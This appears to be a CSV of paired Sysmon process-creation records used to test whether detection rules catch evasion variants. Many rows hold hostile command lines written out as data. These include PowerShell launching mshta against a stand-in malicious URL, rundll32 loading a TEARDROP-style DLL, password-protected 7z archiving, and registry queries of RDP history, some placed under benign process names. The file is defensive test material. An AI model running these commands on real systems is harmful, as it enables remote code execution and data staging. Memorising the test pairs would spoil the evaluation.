Pair Index,Match File,Evasion File,Match Cmd,Evasion Cmd,Match Cmd Type,Evasion Cmd Type
2834,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"""C:\Windows\py.exe"" ""C:\BREACH\create_filing_dir.py""","%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",Windows,Windows
2838,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"{'pid': 1872, 'command_line': '""C:\\Windows\\System32\\xcopy.exe /S /E /C /Q /H \\client\\""Default User""\\  C:\\Users\\""Default User""\\', 'name': 'py.exe', 'args': ['C:\\Windows\\py.exe', 'C:\\BREACH\\create_filing_dir.py'], 'entity_id': '{19FC45AC-74CA-601C-0000-001069A10100}', 'working_directory': 'C:\\BREACH\\', 'parent': {'entity_id': '{19FC45AC-74C7-601C-0000-0010A7240100}', 'pid': 1376, 'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE']}, 'hash': {'md5': 'cc3ac75ddbfaa6d4ccbb0afad7eb759d', 'sha256': '3d98a354f1329bfeb17216d2391d6e9c04f6873b6e491bce9734c02c26574b3d'}, 'executable': 'C:\\Windows\\System32\\xcopy.exe'}","{'args': ['%%SystemRoot%%\\system32\\csrss.exe', 'ObjectDirectory=\\Windows', 'SharedSection=1024,12288,512', 'Windows=On', 'SubSystemType=Windows', 'ServerDll=basesrv,1', 'ServerDll=winsrv:UserServerDllInitialization,3', 'ServerDll=winsrv:ConServerDllInitialization,2', 'ServerDll=sxssrv,4', 'ProfileControl=Off', 'MaxRequestThreads=16'], 'hash': {'sha256': 'f9112b88fec5ef10a7aedf88dcee61956d1fcde7cb42197216e8265578713786', 'md5': '342271f6142e7c70805b8a81e1ba5f5c'}, 'command_line': 'C:\\Windows\\System32\\xcopy.exe /S/E/C/Q/H \\client\\""Default User""\\  C:\\Users\\""Default User""\\', 'working_directory': 'C:\\Windows\\system32', 'parent': {'name': 'smss.exe', 'args': ['\\SystemRoot\\System32\\smss.exe', '00000000', '0000003c'], 'entity_id': '{19FC45AC-76D7-601C-0000-0010CD440000}', 'pid': 296, 'executable': 'C:\\Windows\\System32\\smss.exe', 'command_line': '\\SystemRoot\\System32\\smss.exe 00000000 0000003c '}, 'name': 'csrss.exe', 'entity_id': '{19FC45AC-76D7-601C-0000-0010C4550000}', 'pid': 312, 'executable': 'C:\\Windows\\System32\\xcopy.exe'}",Windows,Windows
2845,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,C:\Windows\system32\svchost.exe -k LocalService,C:\Windows\system32\Macromed\Flash\FlashPlayerUpdateService.exe,Windows,Windows
2846,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"{'executable': 'C:\\Windows\\System32\\PowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell.exe mshta.exe http://malicioussite.com', 'args': ['powershell.exe', 'mshta.exe', 'http://malicioussite.com'], 'hash': {'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}, 'pid': 1000, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'powershell.exe', 'entity_id': '{19FC45AC-7529-601C-0000-0010A9ED0000}'}","{'working_directory': 'C:\\Windows\\system32\\', 'name': 'cmd.exe', 'hash': {'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}, 'entity_id': '{19FC45AC-0988-601D-0000-0010D6D55F00}', 'pid': 3172, 'parent': {'entity_id': '{19FC45AC-76D8-601C-0000-0010F1630000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'args': ['cmd.exe', '/c', 'taskkill.exe', '/im', 'cmd.exe'], 'executable': 'C:\\Windows\\System32\\cmd.exe', 'command_line': 'cmd.exe /c taskkill.exe /im cmd.exe'}",Windows,Windows
2855,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,C:\Windows\system32\svchost.exe -k LocalService,"""C:\Program Files\Mozilla Firefox\uninstall\helper.exe"" /UpdateShortcutAppUserModelIds",Windows,Windows
2856,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"{'executable': 'C:\\Windows\\System32\\PowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell.exe mshta.exe http://malicioussite.com', 'args': ['powershell.exe', 'mshta.exe', 'http://malicioussite.com'], 'hash': {'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}, 'pid': 1000, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'powershell.exe', 'entity_id': '{19FC45AC-7529-601C-0000-0010A9ED0000}'}","{'entity_id': '{19FC45AC-89C6-601C-0000-001024DD1400}', 'command_line': 'cmd.exe /c taskkill.exe -im cmd.exe', 'working_directory': 'C:\\Windows\\System32', 'name': 'cmd.exe', 'hash': {'md5': '9178bd65fc4f7ec665c799dc801d4f1e', 'sha256': '67ec19c47423b9afb9e84e56530ad59db07be36eb68c00edfaf5cb36a0f65ed8'}, 'pid': 2512, 'executable': 'C:\\Windows\\System32\\cmd.exe', 'parent': {'args': ['""C:\\Windows\\explorer.exe""'], 'entity_id': '{19FC45AC-89C4-601C-0000-00103CC41400}', 'pid': 3456, 'executable': 'C:\\Windows\\explorer.exe', 'command_line': '""C:\\Windows\\explorer.exe""', 'name': 'explorer.exe'}, 'args': ['cmd.exe', '/c', 'taskkill.exe', '-im', 'cmd.exe']}",Windows,Windows
2864,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,C:\Windows\system32\svchost.exe -k LocalService,taskhost.exe $(Arg0),Windows,Windows
2865,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"{'executable': 'C:\\Windows\\System32\\PowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell.exe mshta.exe http://malicioussite.com', 'args': ['powershell.exe', 'mshta.exe', 'http://malicioussite.com'], 'hash': {'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}, 'pid': 1000, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'powershell.exe', 'entity_id': '{19FC45AC-7529-601C-0000-0010A9ED0000}'}","{'parent': {'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'powershell.exe', 'args': ['powershell', 'mshta', 'http://maliciousssite.com'], 'entity_id': '{19FC45AC-9ACD-601C-0000-0010F9C71C00}', 'pid': 2508, 'working_directory': 'C:\\Windows\\system32\\', 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell mshta http://malicioussite.com'}",Windows,Windows
2873,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,C:\Windows\system32\svchost.exe -k LocalService,C:\Windows\Explorer.EXE,Windows,Windows
2874,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"{'executable': 'C:\\Windows\\System32\\PowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell.exe mshta.exe http://malicioussite.com', 'args': ['powershell.exe', 'mshta.exe', 'http://malicioussite.com'], 'hash': {'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}, 'pid': 1000, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'powershell.exe', 'entity_id': '{19FC45AC-7529-601C-0000-0010A9ED0000}'}","{'entity_id': '{19FC45AC-74C7-601C-0000-0010A7240100}', 'pid': 1376, 'command_line': 'cmd /c taskkill -im cmd.exe', 'working_directory': 'C:\\Windows\\system32\\', 'args': ['cmd.exe', '/c', 'taskkill', '-im', 'cmd.exe'], 'executable': 'C:\\Windows\\system32\\cmd.exe', 'parent': {'entity_id': '{19FC45AC-74C7-601C-0000-0010DB1E0100}', 'pid': 1328, 'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\explorer.exe', 'name': 'explorer.exe', 'args': ['""C:\\Windows\\explorer.exe""']}, 'name': 'cmd.exe', 'hash': {'md5': '40d777b7a95e00593eb1568c68514493', 'sha256': '0a8ce026714e03e72c619307bd598add5f9b639cfd91437cb8d9c847bf9f6894'}}",Windows,Windows
2883,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_10.json,C:\Windows\system32\svchost.exe -k LocalService,"""C:\Windows\system32\netsh.exe"" interface ip set address ""name=Local Area Connection 2"" static 192.168.56.103",Windows,Windows
2884,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_10.json,"{'executable': 'C:\\Windows\\System32\\PowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell.exe mshta.exe http://malicioussite.com', 'args': ['powershell.exe', 'mshta.exe', 'http://malicioussite.com'], 'hash': {'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}, 'pid': 1000, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'powershell.exe', 'entity_id': '{19FC45AC-7529-601C-0000-0010A9ED0000}'}","{'working_directory': 'C:\\Windows\\System32\\', 'parent': {'args': ['""C:\\Windows\\System32\\cmd.exe""'], 'entity_id': '{19FC45AC-74D4-601C-0000-0010D1400300}', 'pid': 2448, 'executable': 'C:\\Windows\\System32\\cmd.exe', 'command_line': '""C:\\Windows\\System32\\cmd.exe""', 'name': 'cmd.exe'}, 'name': 'reg.exe', 'args': ['reg', '""query""', '""HKEY_CURRENT_USER}\\Software\\Microsoft\\Terminal Server Client\\Default""'], 'entity_id': '{19FC45AC-74D5-601C-0000-00104F4B0300}', 'pid': 2532, 'hash': {'md5': '784a50a6a09c25f011c3143ddd68e729', 'sha256': '661f5d4ce4f0a6cb32669a43ce5deec6d5a9e19b2387f22c5012405e92169943'}, 'executable': 'C:\\Windows\\System32\\reg.exe', 'command_line': 'reg ""query"" ""HKEY_CURRENT_USER}\\Software\\Microsoft\\Terminal Server Client\\Default""'}",Windows,Windows
2893,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,C:\Windows\system32\svchost.exe -k LocalService,C:\Windows\System32\spoolsv.exe,Windows,Windows
2894,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"{'executable': 'C:\\Windows\\System32\\PowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell.exe mshta.exe http://malicioussite.com', 'args': ['powershell.exe', 'mshta.exe', 'http://malicioussite.com'], 'hash': {'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}, 'pid': 1000, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'powershell.exe', 'entity_id': '{19FC45AC-7529-601C-0000-0010A9ED0000}'}","{'pid': 1204, 'args': ['cmd', '/c', 'taskkill', '/im', 'cmd.exe'], 'hash': {'md5': '866a43013535dc8587c258e43579c764', 'sha256': 'b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82'}, 'entity_id': '{19FC45AC-752F-601C-0000-0010F60E0100}', 'executable': 'C:\\Windows\\System32\\cmd.exe', 'command_line': 'cmd /c taskkill /im cmd.exe', 'working_directory': 'C:\\Windows\\System32\\', 'parent': {'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-752D-601C-0000-0010F4630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe'}, 'name': 'cmd.exe'}",Windows,Windows
2903,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,C:\Windows\system32\svchost.exe -k LocalService,"%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",Windows,Windows
2904,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"{'executable': 'C:\\Windows\\System32\\PowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell.exe mshta.exe http://malicioussite.com', 'args': ['powershell.exe', 'mshta.exe', 'http://malicioussite.com'], 'hash': {'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}, 'pid': 1000, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'powershell.exe', 'entity_id': '{19FC45AC-7529-601C-0000-0010A9ED0000}'}","{'command_line': 'powershell mshta.exe http://malicioussite.com', 'working_directory': 'C:\\Windows\\system32', 'parent': {'entity_id': '{19FC45AC-752D-601C-0000-0010A4570000}', 'pid': 340, 'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\explorer.exe', 'name': 'explorer.exe', 'args': ['C:\\Windows\\explorer.exe']}, 'hash': {'md5': '342271f6142e7c70805b8a81e1ba5f5c', 'sha256': 'f9112b88fec5ef10a7aedf88dcee61956d1fcde7cb42197216e8265578713786'}, 'args': ['powershell', 'mshta.exe', 'http://malicioussite.com'], 'entity_id': '{19FC45AC-752D-601C-0000-0010F9570000}', 'pid': 356, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'name': 'powershell.exe'}",Windows,Windows
2913,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,C:\Windows\system32\svchost.exe -k LocalService,"""LogonUI.exe"" /flags:0x0",Windows,Windows
2914,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,"{'executable': 'C:\\Windows\\System32\\PowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell.exe mshta.exe http://malicioussite.com', 'args': ['powershell.exe', 'mshta.exe', 'http://malicioussite.com'], 'hash': {'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}, 'pid': 1000, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'powershell.exe', 'entity_id': '{19FC45AC-7529-601C-0000-0010A9ED0000}'}","{'hash': {'md5': '3ef0d8ab08385aab5802e773511a2e6a', 'sha256': '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6'}, 'pid': 724, 'command_line': 'powershell.exe mshta http://malicioussite.com', 'parent': {'entity_id': '{19FC45AC-74F8-601C-0000-0010595A0000}', 'pid': 396, 'executable': 'C:\\Windows\\System32\\winlogon.exe', 'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe']}, 'args': ['powershell.exe', 'mshta', 'http://malicioussite.com'], 'entity_id': '{19FC45AC-74F9-601C-0000-0010EAC20000}', 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'powershell.exe'}",Windows,Windows
2922,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,C:\Windows\system32\svchost.exe -k LocalService,"%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",Windows,Windows
2923,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"{'executable': 'C:\\Windows\\System32\\PowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell.exe mshta.exe http://malicioussite.com', 'args': ['powershell.exe', 'mshta.exe', 'http://malicioussite.com'], 'hash': {'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}, 'pid': 1000, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'powershell.exe', 'entity_id': '{19FC45AC-7529-601C-0000-0010A9ED0000}'}","{'entity_id': '{19FC45AC-74C2-601C-0000-001019530000}', 'parent': {'args': ['\\SystemRoot\\System32\\smss.exe', '00000000', '0000003c'], 'entity_id': '{19FC45AC-74C2-601C-0000-001088510000}', 'pid': 304, 'executable': 'C:\\Windows\\explorer.exe', 'command_line': '\\Windows\\explorer.exe', 'name': 'explorer.exe'}, 'args': ['cmd', '/c', 'taskkill.exe', '-im', 'cmd.exe'], 'hash': {'md5': '342271f6142e7c70805b8a81e1ba5f5c', 'sha256': 'f9112b88fec5ef10a7aedf88dcee61956d1fcde7cb42197216e8265578713786'}, 'pid': 312, 'executable': 'C:\\Windows\\System32\\cmd.exe', 'command_line': 'cmd /c taskkill.exe -im cmd.exe', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'cmd.exe'}",Windows,Windows
2931,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_09.json,C:\Windows\system32\svchost.exe -k LocalService,"""C:\Program Files\Adobe\Reader 9.0\Reader\reader_sl.exe""",Windows,Windows
2932,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_09.json,"{'executable': 'C:\\Windows\\System32\\PowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell.exe mshta.exe http://malicioussite.com', 'args': ['powershell.exe', 'mshta.exe', 'http://malicioussite.com'], 'hash': {'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}, 'pid': 1000, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'powershell.exe', 'entity_id': '{19FC45AC-7529-601C-0000-0010A9ED0000}'}","{'pid': 2092, 'args': ['reg.exe', 'query', '""HKEY_CURRENT_USER}\\Software\\Microsoft\\Terminal Server Client\\Default""'], 'hash': {'md5': '452fa961163ef4aee4815796a13ab2cf', 'sha256': '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'}, 'entity_id': '{19FC45AC-7500-601C-0000-0010E4830200}', 'executable': 'C:\\Windows\\System32\\reg.exe', 'command_line': 'reg.exe query ""HKEY_CURRENT_USER}\\Software\\Microsoft\\Terminal Server Client\\Default""', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-74FF-601C-0000-0010A0500200}', 'pid': 1616, 'executable': 'C:\\Windows\\System32\\cmd.exe', 'command_line': 'C:\\Windows\\System32\\cmd.exe', 'name': 'cmd.exe', 'args': ['C:\\Windows\\System32\\cmd.exe']}, 'name': 'reg.exe'}",Windows,Windows
2942,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""LogonUI.exe"" /flags:0x0",C:\Windows\System32\spoolsv.exe,Windows,Windows
2944,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"{'hash': {'md5': '3ef0d8ab08385aab5802e773511a2e6a', 'sha256': '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6'}, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'args': ['winlogon.exe'], 'entity_id': '{19FC45AC-752D-601C-0000-0010155A0000}', 'pid': 384, 'executable': 'C:\\Windows\\System32\\winlogon.exe', 'command_line': 'wscript.exe C:\\Windows\\folder1\\trigger.vbs', 'name': 'winlogon.exe'}, 'name': 'LogonUI.exe', 'args': ['LogonUI.exe', '/flags:0x0'], 'entity_id': '{19FC45AC-752E-601C-0000-00100DC30000}', 'pid': 740, 'executable': 'C:\\Windows\\System32\\LogonUI.exe', 'command_line': 'rundll32.exe C:\\Windows\\folder2\\teardrop.dll,Tk_fakeexport'}","{'pid': 1192, 'executable': 'C:\\Windows\\System32\\spoolsv.exe', 'parent': {'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}'}, 'args': ['C:\\Windows\\System32\\spoolsv.exe'], 'entity_id': '{19FC45AC-7529-601C-0000-0010B60C0100}', 'command_line': '7z.exe a  -mx9 -r0 -v500m -pSomePassword .\\archive1.zip .\\file2.log', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'spoolsv.exe', 'hash': {'sha256': 'b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82', 'md5': '866a43013535dc8587c258e43579c764'}}",Windows,Windows
2951,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""LogonUI.exe"" /flags:0x0",C:\Windows\system32\services.exe,Windows,Windows
2953,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"{'hash': {'md5': '3ef0d8ab08385aab5802e773511a2e6a', 'sha256': '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6'}, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'args': ['winlogon.exe'], 'entity_id': '{19FC45AC-752D-601C-0000-0010155A0000}', 'pid': 384, 'executable': 'C:\\Windows\\System32\\winlogon.exe', 'command_line': 'wscript.exe C:\\Windows\\folder1\\trigger.vbs', 'name': 'winlogon.exe'}, 'name': 'LogonUI.exe', 'args': ['LogonUI.exe', '/flags:0x0'], 'entity_id': '{19FC45AC-752E-601C-0000-00100DC30000}', 'pid': 740, 'executable': 'C:\\Windows\\System32\\LogonUI.exe', 'command_line': 'rundll32.exe C:\\Windows\\folder2\\teardrop.dll,Tk_fakeexport'}","{'entity_id': '{19FC45AC-74F8-601C-0000-0010F2600000}', 'command_line': '7z.exe a  -mx9 -r0 -pSomePassword .\\archive1.zip .\\file2.log', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'hash': {'sha256': 'd7bc4ed605b32274b45328fd9914fb0e7b90d869a38f0e6f94fb1bf4e9e2b407', 'md5': '5f1b6a9c35d3d5ca72d6d6fdef9747d6'}, 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'executable': 'C:\\Windows\\System32\\wininit.exe', 'command_line': 'wininit.exe', 'name': 'wininit.exe', 'args': ['wininit.exe'], 'entity_id': '{19FC45AC-74F7-601C-0000-00107B570000}', 'pid': 348}}",Windows,Windows
2959,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"""LogonUI.exe"" /flags:0x0",C:\Windows\system32\Macromed\Flash\FlashPlayerUpdateService.exe,Windows,Windows
